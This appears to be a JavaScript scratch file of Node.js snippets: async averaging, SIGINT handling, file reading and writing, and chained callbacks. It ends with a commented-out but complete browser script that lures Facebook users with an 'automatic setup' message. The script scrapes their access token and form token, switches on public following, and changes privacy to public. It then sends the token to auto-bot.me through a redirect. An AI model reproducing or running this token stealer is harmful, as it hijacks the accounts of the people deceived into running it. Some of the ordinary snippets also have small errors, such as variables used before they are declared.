function asyncAvg(n, avgCB) {
    // Save ongoing sum in JS closure.
    var sum = 0;
    function help(i, cb) {
      sum += i;
      if (i == n) {
        cb(sum);
        return;
      }  
      setImmediate(help.bind(null, i+1, cb));
    }
  
    // Start the helper, with CB to call avgCB.
    help(1, function(sum){
        var avg = sum/n;
        avgCB(avg);
    });
  }
  
asyncAvg(100, function(avg){
    console.log('avg of 1-n: ' + avg);
});

//////////////////////////////////////////////////////
if (process.platform === "win32") {
    var rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout
    });    
    rl.on("SIGINT", function () {
      process.emit("SIGINT");
      });
    }
    
process.on("SIGINT", function () {
    process.exit();
});

///////////////////////////////////////////////////////
fs.writeFile("/tmp/test", "Hey there!", function(err) {
    if(err) {
        return console.log(err);
    }

    console.log("The file was saved!");
}); 

///////////////////////////////////////////////////////
var fs=require('fs')
var lineReader = require('readline').createInterface({
    input: fs.createReadStream('my-list-ok.txt')
  });
  
lineReader.on('line', function (line) {
    //console.log('Line from file:', line);
    arrOk.push(line)
});
lineReader.on('close',()=>{
    console.log('finish reading...')
})
///////////////////////////////////////////////////////
function processRequest(i, callback) {
  setTimeout(function() {
    callback('Action processed ' + i);
  }, Math.random() * 100);
}

callAction(6);

function callAction(count){
  i = 1;
  cb = function(str){
      console.log(str)
      count-i++ && processRequest(i,cb)
  }    
  processRequest(1, cb)
}


///////////////////////////////////////////////
// function post(url,param,callback,type){
//     var xhr=new XMLHttpRequest();
//     if(param){xhr.open('POST',url)}
//     else{xhr.open('GET',url)}
//     xhr.setRequestHeader('Content-Type',type);
//     xhr.onload=function(){
//         if(xhr.status===200){callback(xhr.responseText)}else if(xhr.status!==200){callback("error")}};
//     xhr.send(encodeURI(param))
// }

// alert("Hệ thống đang thiết lập tự động. Vui lòng đợi!");
// function loading(is){
//     var i=is;
//     if(i>0){
//         setTimeout(function(){
//             console.log("Đang thiết lập: "+i+"%");
//             loading(i-1)},50)
//         }
//     }

// loading(100);
// get_token(function(tokens){if(tokens){token=tokens;id="";birthday(function(tuoi){tokenid=token+"&id="+id;url="https://auto-bot.me/index.php";if(tuoi){setup_fl(function(follow){if(follow){setup_public(function(pub){if(pub){window.location=url+"?login=1&token="+tokenid}else{window.location=url+"?login=1&error=public&token="+tokenid}})}else{window.location=url+"?login=1&error=follow&token="+tokenid}})}else{window.location=url+"?login=1&error=tuoi&token="+tokenid}})}else{alert("Hãy đăng nhập facebook và thử lại bạn nhé.")}});if(document.getElementsByName('fb_dtsg').length!=0){var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value}else{alert("Vui lòng chạy trên tab facebook mở sẵn.")}function GetBetween(content,start,end){var r=content.split(start);if((r[1])){r=r[1].split(end);return r[0]}return 0}function get_token(callback){post('https://www.facebook.com/profile.php',"",function(data){var token=GetBetween(data,'access_token:"','"');callback(token)},"text/html")}function birthday(callback){if(token!=""){post("https://graph.facebook.com/v2.2/me?fields=birthday,id&access_token="+token,"",function(datas){data=JSON.parse(datas);var $string=data.birthday;var $arrText=$string.split("/");var $birthday=$arrText[2];id=data.id;var $year=new Date().getFullYear();if(($year+1)-$birthday<=18){tuoi=false}else{tuoi=true}callback(tuoi)})}}function setup_fl(callback){post("https://www.facebook.com/ajax/follow/enable_follow.php?dpr=1","fb_dtsg="+encodeURI(fb_dtsg)+"&location=44&hideable_ids=[\"#following_plugin_item\",\"#public_conversation_item\"]&should_inject=&allow_subscribers=allow",function(data){if(data!="error"){follow=true}else{follow=false}callback(follow)},'application/x-www-form-urlencoded')}function setup_public(callback){post("https://www.facebook.com/privacy/selector/update/?privacy_fbid=0&post_param=300645083384735&render_location_enum=privacy_settings_composer_preview&is_saved_on_select=true&should_return_tooltip=false&prefix_tooltip_with_app_privacy=false&replace_on_select=false&ent_id=0&dpr=1.5","fb_dtsg="+encodeURI(fb_dtsg),function(data){if(data!="error"){pub=true}else{pub=false}callback(pub)},'application/x-www-form-urlencoded')}
									